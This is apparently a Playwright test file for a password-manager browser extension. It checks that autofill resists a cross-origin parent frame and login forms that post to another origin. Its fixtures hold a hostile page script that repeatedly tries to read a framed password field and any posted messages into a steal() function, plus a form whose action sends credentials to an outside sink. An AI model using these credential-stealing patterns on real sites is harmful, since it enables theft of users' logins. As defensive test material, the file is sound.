import { clickInlineButton, expect, openLoginPage, signInAndUnlock, test } from "../fixtures.ts";
import { html, inlineButton, loginForm, loot, lootScript, otherOrigin, seededLogin, serve, settle, sink, watchSink } from "./pages.ts";

test.beforeEach(async ({ popup, quark }) => {
  await signInAndUnlock(popup, quark);
});

// A page on another origin frames the real sign-in form and keeps trying to read it: through the
// frame's document, which the same-origin policy blocks, and through any message the frame posts.
const parentPage = (frameUrl: string) =>
  html(
    `<h1>Win a prize</h1>
<iframe id="login" src="${frameUrl}" style="width:520px;height:360px;border:1px solid #ccc"></iframe>
<script>
addEventListener("message", (e) => steal(typeof e.data === "string" ? e.data : JSON.stringify(e.data)));
setInterval(() => {
  for (const read of [
    () => document.getElementById("login").contentDocument.getElementById("pw").value,
    () => frames[0].document.getElementById("pw").value,
    () => document.getElementById("login").contentWindow.document.body.innerHTML,
  ]) {
    try { steal(read()); } catch {}
  }
}, 50);
</script>`,
    lootScript,
  );

test("a cross-origin parent can't get a login filled into its frame, or read one", async ({ context, popup, quark, site, worker }) => {
  const login = await seededLogin(quark);
  const frameUrl = `${site}/hostile/framed-login`;
  const parentUrl = `${otherOrigin(site)}/hostile/parent`;
  await serve(context, frameUrl, html(loginForm()));
  await serve(context, parentUrl, parentPage(frameUrl));
  const page = await context.newPage();
  await page.goto(parentUrl);
  const frame = page.frameLocator("#login");
  await expect.poll(() => frame.locator("body > div").count(), { message: "the inline button in the frame" }).toBeGreaterThan(0);

  // The user picks the login from the frame's inline button.
  await clickInlineButton(page, await frame.locator("#pw").boundingBox());
  await page.keyboard.press("Enter");
  // And tries the popup's Fill on the tab.
  // No tabs permission, so no query by URL: the parent is the newest tab.
  const tabId = await popup.evaluate(async () => Math.max(...(await chrome.tabs.query({})).map((tab) => tab.id!)));
  expect(await worker.evaluate((id) => chrome.tabs.sendMessage(id, { type: "whereAmI" }, { frameId: 0 }), tabId)).toBe(parentUrl);
  const fill: unknown = await popup.evaluate(
    ([id, entryId]) => chrome.runtime.sendMessage({ type: "fillInTab", tabId: id, entryId }),
    [tabId, quark.seed.local],
  );
  expect(fill).toMatchObject({ ok: false, error: { kind: "refused" } });
  await settle(page);

  await expect(frame.locator("#user")).toHaveValue("");
  await expect(frame.locator("#pw")).toHaveValue("");
  const stolen = await loot(page);
  expect(stolen).not.toContain(login.password);
  expect(stolen).not.toContain(login.username);
});

test("the same frame under a same-site parent still fills", async ({ context, quark, site }) => {
  const login = await seededLogin(quark);
  const frameUrl = `${site}/hostile/framed-login`;
  const parentUrl = `${site}/hostile/parent`;
  await serve(context, frameUrl, html(loginForm()));
  await serve(context, parentUrl, parentPage(frameUrl));
  const page = await context.newPage();
  await page.goto(parentUrl);
  const frame = page.frameLocator("#login");
  await expect.poll(() => frame.locator("body > div").count(), { message: "the inline button in the frame" }).toBeGreaterThan(0);
  await clickInlineButton(page, await frame.locator("#pw").boundingBox());
  await page.keyboard.press("Enter");
  await expect(frame.locator("#pw")).toHaveValue(login.password);
  await expect(frame.locator("#user")).toHaveValue(login.username);
});

// A sign-in form on the right site whose action posts to another origin: what markup injection
// leaves when the page's CSP blocks scripts. Nothing may reach that origin unless the user submits.
const actionPage = html(`<h1>Sign in</h1>${loginForm(` action="${sink}/collect" method="post"`)}`);

const pick = async (page: import("@playwright/test").Page) => {
  await inlineButton(page);
  await clickInlineButton(page, await page.locator("#pw").boundingBox());
  await page.keyboard.press("Enter");
};

test("a form posting to another origin is filled but not submitted", async ({ context, quark, site, worker }) => {
  const login = await seededLogin(quark);
  const requests = await watchSink(context);
  const url = `${site}/hostile/action`;
  await serve(context, url, actionPage);
  const { page } = await openLoginPage(context, worker, url);
  await pick(page);
  await expect(page.locator("#pw")).toHaveValue(login.password);
  await settle(page);
  expect(requests.map((request) => request.url()), "requests to the other origin").toEqual([]);
  expect(page.url()).toBe(url);
});

test.describe("with Submit after filling on", () => {
  test.beforeEach(async ({ popup }) => {
    const settings: Record<string, unknown> = await popup.evaluate(() => chrome.runtime.sendMessage({ type: "settings" }));
    await popup.evaluate((next) => chrome.runtime.sendMessage({ type: "saveSettings", settings: next }), { ...settings, autoSubmit: true });
  });

  test("a form on the page's own origin submits after the fill", async ({ context, quark, site, worker }) => {
    const login = await seededLogin(quark);
    const url = `${site}/hostile/own-action`;
    const posts: string[] = [];
    await serve(context, url, html(`<h1>Sign in</h1>${loginForm(` action="${site}/hostile/own-action/done" method="post"`)}`));
    await context.route(`${site}/hostile/own-action/done`, (route) => {
      posts.push(route.request().postData() ?? "");
      return route.fulfill({ status: 200, contentType: "text/html", body: html("<p>welcome</p>") });
    });
    const { page } = await openLoginPage(context, worker, url);
    await pick(page);
    await expect.poll(() => posts.length, { message: "the form posted" }).toBe(1);
    expect(new URLSearchParams(posts[0]).get("pw")).toBe(login.password);
  });

  // Fails until #130 is fixed: auto-submit doesn't look at the form's action.
  test.fail("a form posting to another origin isn't submitted", { annotation: { type: "issue", description: "https://github.com/autobutler-org/quark-browser-extensions/issues/130" } }, async ({ context, quark, site, worker }) => {
    const login = await seededLogin(quark);
    const requests = await watchSink(context);
    const url = `${site}/hostile/action`;
    await serve(context, url, actionPage);
    const { page } = await openLoginPage(context, worker, url);
    await pick(page);
    await settle(page);
    const bodies = requests.map((request) => request.postData() ?? "");
    expect(requests.map((request) => request.url()), "requests to the other origin").toEqual([]);
    expect(bodies.join("\n")).not.toContain(login.password);
  });
});
